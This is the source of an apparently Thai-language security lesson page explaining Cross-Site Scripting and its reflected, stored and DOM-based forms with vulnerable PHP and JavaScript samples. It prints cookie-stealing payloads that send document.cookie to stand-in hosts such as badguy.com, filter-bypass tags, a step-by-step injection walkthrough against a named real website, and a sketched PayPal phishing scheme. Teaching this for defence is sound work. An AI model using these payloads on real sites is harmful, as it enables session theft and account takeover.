<?php require_once dirname(__FILE__)."/../../_system/system.php";
if(!isset($_SESSION['username'])){
  header("Location: /Login");
}
?>
<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Web title -->
    <title>HAKKA - Lesson</title>

    <!-- Bootstrap CSS -->
    <link href="../../assets/css/bootstrap.min.css" rel="stylesheet">


    <!-- FONT -->

    <link href='https://fonts.googleapis.com/css?family=Nunito' rel='stylesheet'>

    <!-- Custom CSS -->
    <link href="../../assets/custom/style.css?v=22" rel="stylesheet">
    <link href="../../assets/custom/home.css?v=22" rel="stylesheet">
    <link href="../../assets/custom/parallax.css?v=22" rel="stylesheet">
    <link href="../../assets/custom/animation.css?v=22" rel="stylesheet">
    <link href="../../assets/custom/carousel.css?v=22" media="screen" rel="stylesheet">
    <link href="../../assets/custom/border.css?v=22" media="screen" rel="stylesheet">
    <link href="../../assets/custom/learn.css?v=22" media="screen" rel="stylesheet">


    <!--load all Font Awesome styles -->
    <link href="../../assets/fontawesome/css/all.css" rel="stylesheet">

    <!-- Jquery CDN -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
    </script>
</head>

<body>
    <div class="container mt-3">
        <nav class="navbar navbar-expand-lg">

            <a class="navbar-brand" href="#"></a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
                aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <i class="fa fa-bars text-white" aria-hidden="true"></i>
            </button>
            <div class="collapse navbar-collapse fade-in" id="navbarNav">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0 text-white text-center">
                    <img width="50%" src="../../public/img/logo.png">
                </ul>
                <ul class="navbar-nav text-white text-center">
                    <a class="nav-link textw " aria-current="page" href="../../Home/">Home</a>
                    <li class="nav-item">

                    </li>
                    <li class="nav-item">
                        <a class="nav-link textw active" href="../../Lesson/">Lesson</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link textw" href="../../Lesson/Test">Exercise</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link textw" href="../../Lab/">Lab</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link textw" href="../../Rank/">Ranking</a>
                    </li>
                    <li><span style="padding-right:100px;"></span></li>
                </ul>

                <ul class="nav navbar-nav navbar-right">
                    <a href="../../Profile/"><img src="<?php echo $_SESSION['profile']; ?>"
                            style="border: 4px solid white;border-radius: 20px; width: 90px; height: 90px; object-fit: cover;"></a>
                </ul>
            </div>
        </nav>

    </div>

    <div class="container mt-5">
        <div class="mt-4">
            <a href="../../Lesson/" style="width: 250px;" class="btn btn-custom"><i
                    style="margin-right: 10px;" class="fa-solid fa-circle-arrow-left"></i> กลับสู่หน้าหลัก</a>
        </div>
        <div class="row mt-4">
            <div class="col-lg-12 text-white">
                <div class="custom-border">
                    <div class="container">
                        <div class="mt-1">
                            <h2 style="color: #F0A500;"><b style="color:white;">Cross Site Scripting ( XSS )</b></h2>
                        </div>
                        <div class="mt-4">
                            <span class="badge background-gradient"><span class="text-white"
                                    style="font-size: 18px;text-shadow: black 2px 0 5px; font-weight: 900;padding: 5px;">Beginner</span></span>
                        </div>
                        <div class="mt-4">
                            <span><i class="fa-solid fa-book-bookmark" style="padding-right: 9px;"></i> 30
                                แบบฝึกหัด</span>
                            <span style="padding-left: 25px;"><i class="fa-solid fa-star"
                                    style="padding-right: 9px;"></i> 60 คะแนน</span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="col-lg-6" style="position: relative; bottom: 120px; right:80px;">
                <a href="../Security/"><img width="40px" src="../../public/img/icon/back.png"></a>
            </div>
            <div class="col-lg-6 text-end" style="position: relative; bottom: 120px; left:80px;"">
            <a href="../SQLi/"><img width="40px" src="../../public/img/icon/next.png"></a>
            </div>



            <div class="col-lg-12 text-white">
                <b style="color:#F0A500;">Cross-Site Scripting (XSS)</b> เป็นรูปแบบหนึ่งของการ <b
                    style="color:#F0A500;">injection</b> ซึ่ง <b style="color:#F0A500;">Script</b> ที่เป็นอันตรายจะถูก
                <b style="color:#F0A500;">inject</b> เข้าไปในเว็บไซต์ที่ปลอดภัยและเชื่อถือได้ การโจมตี <b
                    style="color:#F0A500;">XSS</b> เกิดขึ้นเมื่อ <b style="color:#F0A500;">Attacker</b><br>
                ใช้ <b style="color:#F0A500;">web applicaiton</b> เพื่อส่ง <b style="color:#F0A500;">code</b>
                ที่เป็นอันตราย ซึ่งโดยทั่วไปจะอยู่ในรูปแบบของ <b style="color:#F0A500;">script</b> ฝั่งไว้บน <b
                    style="color:#F0A500;">browser</b> ไปยัง <b style="color:#F0A500;">user</b> คนอื่น
                ข้อบกพร่องที่ช่วยให้การโจมตีเหล่านี้ประสบความสำเร็จ
                นั้นค่อนข้างแพร่หลายและเกิดขึ้นได้ทุกที่ที่ <b style="color:#F0A500;">web applicaiton</b> ใช้ <b
                    style="color:#F0A500;">input</b> จาก <b style="color:#F0A500;">user</b> ภายใน และ <b
                    style="color:#F0A500;">output</b> ที่สร้างขึ้นโดยไม่ต้องตรวจสอบความถูกต้องหรือการเข้ารหัส
            </div>

            <div class="col-lg-12 mt-5 text-white">
                <div class="custom-border">
                    <div class="container">
                        <div class="">
                            <div class="card-header background-gradient" style="border-radius: 10px;">
                                <span style="font-size: 24px;text-shadow: black 2px 2px 2px;">Cross-Site Scripting
                                    (XSS)</span>
                            </div>
                        </div>
                        <div class="mt-3" style="position: relative;">
                            <div class="collapse" id="collapseExample">
                                <!-- Content -->
                                <div class="row">
                                    <div class="col-lg-6">
                                        <img width="100%" src="../../public/img/learn/1.png">
                                    </div>
                                    <div class="col-lg-6">
                                        <h3>Cross Site Scripting</h3>
                                        <p>XSS หรือ Cross Site Scripting คือการส่งสคริปข้ามเว็บไซต์เพื่อโจมตี
                                            เหยื่อที่เปิดเข้าไปหรือโจมตีหน้าเว็บเพจ ที่ Hacker นิยมใช้กันโดยอาศัยช่อง
                                            โหว่ของเว็บจำพวกเว็บบอร์ด เป็นต้น เพื่ออัพ Script ซึ่งเขียนด้วย JavaScript
                                        </p>

                                        <p>การโจมตีและช่องโหว่ประเภท Cross-site Scripting (XSS) ช่องโหว่ทั้ง 3
                                            ประเภท ( Reflected, Stored, และ DOM-based XSS ) เกิดจากการที่ผู้
                                            พัฒนาเว็บแอปพลิเคชันไม่ได้ทำการตรวจสอบข้อมูลที่ได้รับมาจากผู้ใช้งานให้ดี
                                            ก่อนนำไปแสดงผลให้กับผู้ใช้งานคนอื่น ดังนั้นหากต้องการป้องกันการเกิดช่อง
                                            โหว่ประเภทนี้ ต้องเริ่มต้นที่การตรวจสอบและคัดกรองข้อมูลที่ได้รับมาจากผู้ใช้
                                            งานให้ดี ( หลักการป้องกันเดียวกับ SQL Injection )</p>
                                    </div>

                                    <div class="col-lg-12 mt-5">
                                        <h3>มาดูตัวอย่างการฝังโค้ดกัน
                                        </h3>
                                    </div>

                                    <div class="col-lg-12 mt-5">
                                        <div class="custom-border">
                                            &lt;img src=’javascript:alert(“Kao Possawat”); document.location =
                                            “http://www.example.com/cookie.php?cookie=”+document.cookie;’ />
                                        </div>
                                    </div>

                                    <div class="col-lg-12 mt-5">
                                        <img width="100%" src="../../public/img/learn/2.png">
                                    </div>

                                    <div class="col-lg-12 mt-4 text-center">
                                        <p class="smalltext"><b>รูปภาพนี้อ้างอิงมากจาก</b>
                                            <br>https://www.freepik.com/search?format=search&query=Hack
                                            <br>และไม่มีการใส่คำสั่งใดๆลงไปภายในเว็บไซต์
                                            เป็นเพียงการทำให้เห็นภาพที่ชัดเจนขึ้น
                                        </p>
                                    </div>

                                    <div class="col-lg-12 mt-5">
                                        <p>หลังจากได้ลองใส่ชุดคำสั่งลงไปเราจะเห็นได้ว่า เมื่อผู้ใช้มีการโหลดรูปก็มีการ
                                            alert
                                            ขึ้นมาว่า “ Kao Possawat “ และหลังจากนั้นจะมีการเปลี่ยนหน้าเว็บเพจไปที่
                                            www.example.com/cookie.php พร้อมกับ Cookie ของเรา และนั้นหมายถึง Cookie
                                            ของเราได้ถูกขโมยไปด้วยแล้วนั้นเองครับ</p>

                                        <p>การโจมตีและช่องโหว่ประเภท Cross-site Scripting (XSS) ช่องโหว่ทั้ง 3 ประเภท (
                                            Reflected, Stored, และ DOM-based XSS ) เกิดจากการที่ผู้พัฒนา
                                            Web Application
                                            ไม่ได้ทำการตรวจสอบข้อมูลที่ได้รับมาจากผู้ใช้งานให้ดีก่อนนำไปแสดงผลให้กับผู้ใช้งานคนอื่น
                                            ดังนั้น หากต้องการป้องกันการเกิดช่องโหว่ประเภทนี้
                                            ต้องเริ่มต้นที่การตรวจสอบและคัดกรองข้อมูลที่ได้รับมาจากผู้ใช้งานให้ดี (
                                            หลักการป้องกันเดียวกับ SQL Injection )</p>

                                        <p>ภายในเว็บไซต์นั้นจะต้องมีการใช้ข้อมูลส่วนตัวบางส่วนของผู้เยี่ยมชมในการเข้าถึงข้อมูลภายในเว็บไซต์
                                            โดยพวก Hacker จะแอบบสร้างลิงก์ขึ้นมาบนหน้าเว็บไซตที่เป็น
                                            เป้าหมายด้วยการใส่คำสั่ง Script
                                            ลงไปโดยอาศัยช่องโหว่ภายในเว็บไซต์ของเราที่ระบบป้องกันนั้นเข้าไม่ถึงหรือพลาดไปแล้วแอบทำการขโมยข้อมูลที่
                                            User กรอกไว้
                                            โดยทำให้ผู้ใช้นั้นตายฝใจว่าเป็นการให้ข้อมูลติดต่อกับทางเว็บไซต์ซึ่งเทคนิดการโจมตีนี้เรียกว่า
                                            Cross - Site Scripting เมื่อ Hacker ได้รับข้อมูลไปแล้วพวกเข้าก็จะ
                                            ทำการส่วมรอยเป็นคุณโดยไปทำการ Login เข้าใช้บริการต่างๆของคุณ
                                            ซึ่งนี้บอกได้ว่า
                                            XSS คือเทคนิคที่เป็นการส่งลิงก์ที่ทำการใส่ Script การทำงานเข้าไป เพื่อที่จะ
                                            ทำให้หน้าเว็บนั้นทำการโชว์ช่องโหว่ โดยหลอกให้ User
                                            กรอกข้อมูลสำคัญลงไปและส่งไปยัง Hacker แทนที่จะเป็นเว็บไซต์นั้นเอง</p>

                                        <p>เดี๋ยวเราจะมาเริ่มจากการ XSS ( ผมรู้ครับว่าหลายคนอาจจะยังไม่ค่อยเข้าใจ XSS
                                            มากเท่าไหร่ ว่าจริงๆแล้วมันทำอะไรได้บ้าง ) ซึ่งผมจะมาอธิบายให้ฟังแบบเข้าใจ
                                            ง่ายๆกัน ส่วนใครที่อยากอ่านเป็นข้อความเยอะๆ
                                            สามารถหาอ่านได้ตามอินเตอร์เน็ตเลยครับ</p>

                                        <p>เอาล่ะครับ เรามาเข้าเนื้อหากันดีกว่า เพื่อไม่ให้เสียเวลา.... โดยเจ้าตัว XSS
                                            เนี่ยเราสามารถพบเจอไดมันได้ง่ายมากๆเลยครับ น่าจะประมาณ 50 - 70 %
                                            ของเว็บไซต์ได้เลยนะ
                                            ครับ เพราะเว็บไซต์ที่มันมีการเรียกเก็บค่าจาก Input
                                            ทั้งหลายนั้นแทบจะทั้งหมดจะมีบัคนี้ทั้งนั้น ( บางคนอาจจะงงๆ อยู่ว่า Input
                                            ที่ว่าคือยังไง ถ้าให้ผมสรุปสั้นๆ ก็น่าจะ
                                            ประมาณ เว็บไวต์ที่มีการกรอกค่าต่างๆลงไปภายในเว็บ นั้นและครับ )</p>

                                        <h3 class="mt-4">ความรู้ที่เราควรจะมีในระดับนึง</h3>

                                        <li>ต้องมีพื้นฐานเกี่ยวกับ HTML (
                                            ไม่จำเป็นต้องเขียนเว็บได้แค่รู้โครงสร้างการเียนก็เพียงพอ )</li>
                                        <li>ใช้ JavaScript เป็นและรู้จักพวกคำสั่งที่มันจำเป็น</li>
                                        <li>รู้เกี่ยวกับ PHP , ASP ในเรื่องของการ Comment ประมาณนึงก็เพียงพอ</li>
                                        <li>ข้อนี้สำคัญมากครับ ต้องมีสามัญสำนึกที่ดีมากๆ (
                                            ผมอยากจะสอนให้เก็บไว้เป็นความรู้ติดตัวเพื่อนำไปต่อยอด
                                            ไม่ใช่นำไปใช้เพื่อโจมตีคนอื่น )</li>

                                        <h3 class="mt-4">ความอันตรายที่อาจเกิดขึ้นจากการเจาะระบบแบบนี้</h3>
                                        <li>มีตั้งแต่ระดับที่ ต่ำ ไปจนถึง ระดับปลานกลาง</li>

                                        <p class="mt-4">มันก็จะประมาณว่าแบบ.... เหมือนเป็นการเล่นจำอวดอะครับ
                                            อารมณ์มันจะประมาณว่าแบบ เออเรา Hack
                                            ได้นิหว่าทั้งที่ในความเป็นจริงแล้วสิ่งที่ทำไปมันไม่ได้ส่งผลกระทบ
                                            อะไรให้กับตัว Host เลยสักนิด เพราะมันเป็นการที่เราใส่คำสั่งเป็น Code
                                            ลงไปให้มัน Run บนเครื่องของคนที่กำลังใช้เว็ปไซต์ ( Client ) แล้ว Script
                                            ที่ฝั่งอยู่ในเว็บไซต์
                                            มันก็จะไปทำการ Run บน Client หลังจากนั้นเราก็จะสามารถ ทำการประยุกต์ใช้กับการ
                                            ขโมย Cookie ของ User ได้อีกด้วย แล้วถ้าเกิดเราโชคดีได้ User ในระดับของ
                                            admin เหมือนกับบางเว็บไซต์ที่โดนไป....... ( รู้ๆกันอยู่ว่าเว็บกากขนาดไหน
                                            55555 ) นั้นและครับถ้าเกิดเราได้อะไรในระดับนี้มาได้
                                            มันจะเพิ่มความอันตรายเป็นอย่างมาก
                                            เลยครับ </p>

                                        <p>เอาละครับต่อจากนี้เดี๋ยวผมจะมายกตัวอย่าง แบบที่มันค่อนข้างที่จะ
                                            ไกลตัวเราหน่อยแล้วกัน
                                            (ไกลในระดับที่ว่าถ้าเริ่มทำก็เหมือนเอาขาข้างนึงเข้าไปอยู่ลูกกรงแล้ว 5555)
                                            ซึ่งเหยื่อรับเชิญของเราในวันนี้ก็ คือออออ.....
                                            http://www.stanica.sk/main.php
                                            นั้นเองบอกก่อนอันนี้เป็นเว็บที่มีเอาไว้ทดลองเล่นนะครับห้ามไปทำกับเว็บไซต์อื่น
                                            ละเดี๋ยวตำรวจมาหาที่หน้าบ้าน 5555</p>

                                        <p>มาเดี๋ยวมาเริ่มกันเลยดีโดยหลักๆแล้วเนี่ยการจะหา XSS ก็คือ</p>

                                        <li>ทำการเปิดเว็บไซต์ที่ให้ไปขึ้นมา</li>
                                        <li>จากนั้นทำการเปิด View Source</li>
                                        <li>และสุดท้ายเลยนะ คือใช้สกิลที่มาตั้งแต่เกิดของเรา นั้นก็คือการ เดา !! ครับ (
                                            แต่ก็ต้องมีหลักการหน่อยนนะครับ 555 )</li>


                                        <p class="mt-4">ก่อนจะเริ่มกันนะครับ จะขอพูดถึงหลักการเดากันก่อน
                                            โดยที่ผมจะบอกคือ ของพวกนี้มันไม่มีจุดในที่ตายตัวครับ และก็อย่างที่ผมบอกไป
                                            เราต้องหาจุดที่เป็น Input
                                            ว่าตรงไหนที่มันสามารถใส่ค่าลงไปได้ โดยต้องทำการลองให้หมดจนกว่าจะเจอครับ
                                            เดี๋ยวมาเริ่มเลย</p>


                                        <img width="100%" src="../../public/img/learn/3.png">
                                        <div class="mt-5 text-center">
                                            <h4>อันนี้จะเป็นหน้าตาของเว็บไซต์ที่เราจะใช้ทำการทดลองกันครับผม</h4>
                                        </div>
                                        <img class="mt-5" width="100%" src="../../public/img/learn/4.png">
                                        <div class="mt-5 text-center">
                                            <h4>ส่วนนี้เป็นหน้าต่างในตอนที่เราทำการเปิด View Source ขึ้นมา</h4>
                                        </div>

                                        <p class="mt-4">พอเราทำการเปิด View Source ขึ้นมาแล้ว
                                            ให้ทำการเลื่อนลงมาประมาณนึงเราจะเจอเข้ากับ &lt;a
                                            href=”main.php?page=STANICA&lang=SK”> แต่ว่านะไอ้ Code ตัวนี้พิเศษยังไงหรอ
                                            5555 อย่างที่ผมเคยบอกไปครับเราต้องมาทำการมั่วกัน เอาเป็น.... ลองใส่ URL
                                            ดูละกันนะ</p>
                                        <p><b>http://www.stanica.sk/main.php?page=STANICA&lang=SK</b></p>

                                        <div class="mt-4 custom-border">
                                            ซึ่งคาจะมันรับเข้าไปก็น่าจะเป็น STANICA กับ SK แต่ว่านะ
                                            มันก็ไม่ค่อยแปลกอะไรจริงไหมครับ 55555
                                        </div>

                                        <div class="mt-4 custom-border">มาเรามาลองมั่วกันใหม่ดูอีสักรอบกัน ลองเอาเป็น
                                            http://www.stanica.sk/main.php?page=STANICA&lang=โครตจะมั่ว</div>

                                        <p class="mt-4">เป็นไงละที่นี้ ทางฝั่งซ้ายนี้หายเป็นแถวเลยใช่ไหมละ
                                            แบบนี้โครตจะเข้าทางโจร แต่แค่นี้เรายังไม่พอใจเอาอีก เดะเปิด View Source
                                            ขึ้นมาใหม่กันครับ
                                            ( เดี๋ยวเราจะเลือกเป็น ภาษาไทยนะครับ
                                            เพราะเดี๋ยวไม่งั้นส่วนที่เป็นภาษาไทยจะเป้น ภาษต่างดาว
                                            หรือไอ้ตัวเหลี่ยมๆที่เคยเห็นกันนั้นและครับ ) ซึ่งเราจะ
                                            เห็นได้ว่ามีการเปลี่ยนแปลง ในส่วนของ Source ของ Page จาก
                                            &lt;a href=”main.php?page=STANICA&lang=SK”> กลายมาเป็น &lt;a
                                            href=”main.php?page=STANICA&lang=โครตจะมั่ว”></p>

                                        <div class="mt-4 custom-border">อะทีนี้ ถ้าเราลองเปลี่ยนจาก ( โครตจะมั่ว ) เป็น
                                            (“&lt;/a>code html here”) ดูละ เพราะตามที่คิดเอาไว้ใน Source
                                            มันก็น่าจะกลายไปเป็น<br>
                                            &lt;a href=”main.php?page=STANICA&lang=”&lt;/a>code html here””></div>

                                        <p class="mt-4">ว้าวววว
                                            พอเราจินตนาการดูถึงผลที่จะเกิดขึ้นแล้วเดี๋ยวเรามาลองกันเลยแล้วกันนะ</p>

                                        <p><b>http://www.stanica.sk/main.php?page=STANICA&lang=%22%3C/a%3Ecode%20html%20here%22</b>
                                        </p>

                                        <p>เป็นยังไงกันบ้างงงง เห็นไหมว่าพอทำเสร็จแล้ว ทางฝั่งซ้ายจะกลายเป็น Code html
                                            here โผล่มาเต็มไปหมดเลย ที่นี้ก็เหมือนกับว่าเราได้เขียน อะไรลงไปบน Link
                                            ก็จะขึ้นที่เว็ปไซต์หมดเลยที่นี้ ลองคิดดูเล่นๆนะครับ</p>

                                        <p>ถ้าสมมุติว่ามีคนเจอ XSS ของเว็บไซต์ เกี่ยวกับการซื้อสินค้า....
                                            ไม่เอาละยากไปเดี๋ยวงง เอาเป็นว่าเราไปเจอ XSS ของ Paypal ละกัน
                                            ดูใกล้ตัวดีเพราะใช้บ่อย ก็คือ
                                            ถ้าเกิดมี Hacker คนนึงทำการเขียน Code ทำเป็นหน้า Login ของตัวแอพ Paypal
                                            ไปไว้ในส่วนของ Host Free ของหน้าต่างเว็ปซึ่งจะเป็นเว็ปแนวเหมือนกับ
                                            Pushing หน้าตาก็คือ Paypal มาเองเลย แต่ว่าจะเขียนให้เก็บค่าจากหน้าปลอม (
                                            Form Login ) เก็บไว้ให้ในส่วนของตัว Hacker เองกลับมาอ่านได้จากนั้นก็ทำการ
                                            เขียน Code ต่อท้ายเพิ่มเข้าไปให้ Redirect กลับไปยังหน้า Paypal ของจริงครับ
                                        </p>

                                        <p>จากนั้นถ้าเราเอา Code iframe มาใส่ต่อท้ายเว็บของ Paypal จริงดูละ
                                            มันจะเกิดอะไรขึ้น</p>

                                        <p>ผลที่ได้จากการทำแบบนั้นไปก็คือ ผู้ใช้ที่ทำการ Login เข้าไป แทนที่จะไปเข้า
                                            Paypal จะกลายเป็นว่าผู้ใช้ไปเข้าในส่วนของเว็ปไซต์ที่ Hecker สร้างขึ้นแทน</p>

                                        <h3 class="mt-5">แหล่งข้อมูลอ้างอิง</h3><br>
                                        <a
                                            href="https://vir9.com/xss-%E0%B8%84%E0%B8%B7%E0%B8%AD%E0%B8%AD%E0%B8%B0%E0%B9%84%E0%B8%A3/">https://vir9.com/xss-%E0%B8%84%E0%B8%B7%E0%B8%AD%E0%B8%AD%E0%B8%B0%E0%B9%84%E0%B8%A3/</a><br><br>
                                        <a class=""
                                            href="https://kixoqxq59.medium.com/%E0%B8%81%E0%B8%B2%E0%B8%A3%E0%B9%82%E0%B8%88%E0%B8%A1%E0%B8%95%E0%B8%B5%E0%B9%81%E0%B8%9A%E0%B8%9Across-site-scripting-xss-%E0%B8%84%E0%B8%B7%E
                                            0%B8%AD%E0%B8%AD%E0%B8%B0%E0%B9%84%E0%B8%A3-a40abe818e44">https://kixoqxq59.medium.com/%E0%B8%81%E0%B8%B2%E0%B8%A3%E0%B9%82%E0%B8%88%E0%B8%A1%E0%B8%95%E0%B8%B5%E0%B9
                                            %81%E0%B8%9A%E0%B8%9Across-site-scripting-xss-%E0%B8%84%E0%B8%B7%E
                                            0%B8%AD%E0%B8%AD%E0%B8%B0%E0%B9%84%E0%B8%A3-a40abe818e44</a>
                                    </div>

                                </div>
                            </div>
                        </div>

                        <div class="mt-5">
                            <input data-bs-target="#collapseExample" type="button" style="width: 250px;"
                                onclick="readmore(this)" value="อ่านเพิ่มเติม" class="btn-custom-border"
                                data-bs-toggle="collapse" aria-expanded="false" aria-controls="collapseExample">
                        </div>
                    </div>
                </div>
            </div>





















            <div class="col-lg-12 mt-5 text-white">
                <div class="custom-border">
                    <div class="container">
                        <div class="">
                            <div class="card-header background-gradient" style="border-radius: 10px;">
                                <span style="font-size: 24px;text-shadow: black 2px 2px 2px;">Cross - Site Scripting
                                    ทั้ง 3 ประเภท</span>
                            </div>
                        </div>

                        <div class="mt-3" style="position: relative;">
                            <div class="collapse" id="collapseExample2">
                                <!-- Content -->
                                <h3 class="mt-4">Reflected XSS</h3>
                                <p>Reflect XSS เป็นชนิดที่สามารถผมได้บ่อยที่สุดใน XSS ทั้ง 3 ตัว (
                                    ส่วนมากจะเจออยู่ในช่องค้นหน้า หรือ Search ) ของ Web Application โดยหลักการ
                                    ของมันก็ไม่มีอะไรมากมาย เพียงแค่ให้ User ทำการส่ง JavaScript ผ่านทางช่องรับข้อมูล
                                    หรือก็คือ URL นั้นเองครับ </p>

                                <h3 class="mt-4">ตัวอย่างซอร์สโคดที่มีช่องโหว่ XSS</h3>
                                <div class="custom-border mt-4 text-white">
                                    &lt;?php<br><br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$keyword
                                    =
                                    $_GET [ ‘ keyword ‘ ] ;<br><br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
                                    “Search Keyword:”. $keyword;<br><br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;doSomeSearch
                                    ($leyword);<br><br>
                                    ?>
                                </div>

                                <p class="mt-4">ตย. จากรูปด้านบนนั้นเป็น Source Code PHP ที่ทำการรับ Keyword แบบ GET
                                    มากจาก
                                    URL เพื่อที่จะทำการค้นหาข้อมูล ซึ่งนี้เป็นรูปแบบที่เราพบเห็นมาก
                                    ที่สุดตามเว็ปไซต์ต่างๆ อย่างไรก็ตามนะครับ การที่ Web Application มีการแสดง Keyword
                                    ที่ได้รับจากผู้ใช้งานโดยที่ไม่ได้ตรวจสอบมันอย่างละเอียดก็อาจ
                                    จะทำให้เกิดช่องโหว่ของReflected XSS</p>

                                <div class="custom-border mt-4 text-white">
                                    http://www.someweb.com/search.php?keyword=&lt;script>window.location='http://www.badguy.com?victim
                                    _cookie=' + document.cookie;&lt;/script>
                                </div>

                                <p class="mt-4">Hacker สามารถที่จะสร้างลิงก์ URL แบบตัวอย่างจากข้างบนแล้วทำการส่ง URL
                                    ไปให้กับเหยื่อผู้โชคร้าย เมื่อ User ทำการกดลิงก์ ดังกล่าวผู้ใช้งานก็จะถูก
                                    Redirect ไปยังเว็ปไซต์ของ Hacker พร้อมทั้งส่ง Web Cookie ของเราไปด้วย</p>

                                <div class="text-center mt-5">
                                    <img class="w-75" src="../../public/img/learn/5.png">
                                </div>

                                <h3 class="mt-5">Stored XSS</h3>

                                <p class="mt-4">Stored XSS มีลักษณะแตกต่างกับ Reflexed XSS ตรงที่ ผู้ไม่หวังดีจะใส่
                                    JavaScript ลงในฐานข้อมูลของเว็บแอปพลิเคชันเป้าหมาย และเมื่อผู้ใช้งานคนอื่น
                                    เข้ามาใช้งานเว็บแอปพลิเคชันที่มีช่องโหว่ก็จะได้รับ JavaScript
                                    ที่เป็นอันตรายจากเว็บแอปพลิเคชันที่ตกเป็นเหยื่อ Stored XSS พบได้บ่อยในกระดานสนธนา
                                    ( webboard หรือ forum ) โดย attacker จะทำการแทรก JavaScript เพื่อตอบกระทู้
                                    เมื่อผู้ใช้งานคนอื่นกดดูกระทู้เบราเซอร์ก็จะทำการรัน JavaScript
                                    ในคำตอบที่ attacker ได้ใส่ไว้ อย่างไรก็ตาม
                                    เนื่องจากปัจจุบันเว็บแอปพลิเคชันส่วนใหญ่ได้หันมาใช้กระดานสนธนาสำเร็จรูป เช่น SMF
                                    ทำให้ช่องโหว่ประเภทนี้ลด
                                    น้อยลง</p>

                                <h3 class="mt-4">ตัวอย่าง Stored XSS</h3>

                                <div class="text-center mt-5">
                                    <img class="w-75" src="../../public/img/learn/6.png">
                                </div>

                                <p class="mt-5">จากตัวอย่างจะเห็นได้ว่า Attacker ทำการบันทึก JavaScript
                                    ที่ใช้ในการส่งข้อมูลลับของผู้ใช้งาน ( เช่น Cookie ) ไปให้กับเว็บไซต์ของตนเอง
                                    JavaScript
                                    ที่ถูกฝังอยู่ในฐานข้อมูลของเว็บไซต์ที่มีช่องโหว่จะถูกส่งไปให้กับผู้ใช้งานเมื่อผู้ใช้งานเรียกดูข้อมูล
                                    ( เช่น กระทู้ ) ที่ Attacker ได้ฝังซอร์สโค้ดไว้</p>

                                <p><b>วิธีการฝัง JavaScript ลงในฐานข้อมูล</b></p>

                                <p>จุดมุ่งหมายของ XSS คือการทำให้ผู้ใช้งานคนอื่นที่ตกเป็นเหยื่อทำการเรียกใช้ JavaScript
                                    ที่ฝังไว้ ดังนั้น attacker จะหาทางในการฝัง JavaScript ด้วย tag ต่าง ๆ เช่น tag
                                    &lt;script>&lt;/script></p>

                                <div class="mt-4 custom-border">
                                    &lt;script src=http://badguy.com/xss.js>&lt;/script><br><br>
                                    &lt;script>window.location="http://badguy.com?cookie=" + document.cookie&lt;/script>
                                </div>

                                <p class="mt-4">หลายเว็บไซต์พยายามป้องกัน XSS ด้วยการกรอง tag &lt;script>&lt;/script>
                                    ออกจากข้อมูลที่ได้รับมาจากผู้ใช้งาน อย่างไรก็ตาม ยังมีอีกหลายวิธีการที่ใช้
                                    ในการเรียกฝัง
                                    JavaScript โดยไม่จำเป็นต้องใช้ tag &lt;script>&lt;/script> เช่น attacker สามารถใส่
                                    tag
                                    &lt;body onload> เพื่อเรียกใช้ JavaScript ได้</p>
                                <div class="mt-4 custom-border">
                                    <p>&lt;body onload=alert("XSS")></p>
                                    <p>&lt;body background="javascript:alert("XSS")">&lt;/body></p>
                                </div>

                                <p class="mt-4">หรือ tag &lt;table background> ในการเรียกใช้ JavaScript ก็สามารถทำได้
                                </p>

                                <div class="mt-4 custom-border">
                                    <p>&lt;table background="javascript:alert('XSS')"></p>
                                    <p>&lt;td background="javascript:alert('XSS')"></p>
                                </div>

                                <h3 class="mt-4">DOM-based XSS</h3>
                                <p class="mt-4">DOM-based XSS เป็นช่องโหว่ XSS ที่ตรวจสอบพบได้ยากกว่า Reflected XSS และ
                                    Stored XSS เนื่องจาก DOM-based XSS นั้นไม่จำเป็นต้องพึ่งพา back-end ในการแสดงผล
                                    JavaScript ให้กับผู้ใช้งาน</p>
                                <h3 class="mt-4">ทบทวน Document Object Model และ JavaScript</h3>
                                <p class="mt-4">เมื่อเว็ปเบราเซอร์ทำการโหลด HTML ของ webpage สำเร็จ
                                    ก็จะสร้างสิ่งที่เรียกว่า
                                    Document Object Model (DOM) ขึ้นโดย โดยเปรียบเสมือน Object ของเอกสารในหน้านั้น ๆ โดย
                                    JavaScript มีความสามารถในการแก้ไข Object ใน HTML DOM ได้ </p>
                                <p>เมื่อ JavaScript สามารแก้ไขหน้า HTML ได้ หากมีช่องโหว่ใน JavaScript
                                    ที่ทำให้ผู้ไม่หวังดีทำการใส่ JavaScript ได้จะถูกจัดเป็นช่องโหว่ประเภท
                                    DOM-based XSS</p>

                                <h3 class="mt-4">ตัวอย่าง DOM-based XSS</h3>

                                <div class="mt-4 custom-border">
                                    Welcome to our website<br>
                                    &lt;script><br>
                                    var pos = document.URL.indexOf("name=") + 5;<br>
                                    var s = decodeURIComponent(document.URL.substring(pos, document.URL.length));<br>
                                    document.write(s);<br>
                                    &lt;/script>
                                </div>

                                <p class="mt-4">Source Code ด้านบนเป็นตัวอย่างของเว็บไซต์ที่มีช่องโหว่ประเภท DOM-based
                                    XSS
                                    การทำงานคือ ผู้ใช้งานสามารถกรอก username ใส่เข้ามาเป็น parameter ของ URL แล้ว
                                    JavaScript
                                    จะทำการแสดงข้อความต้อนรับ
                                </p>
                                <div class="mt-4">
                                    <img class="w-50" src="../../public/img/learn/7.png">
                                </div>

                                <p class="mt-4">ผู้ไม่หวังดีสามารถแทรก JavaScript ลงใน URL ได้โดยการเปลี่ยน URL เป็น</p>

                                <div class="mt-4 custom-border">
                                    http://somesite.com/owasp/dom-xss.php?name=&lt;script>alert(document.cookie)&lt;/script>
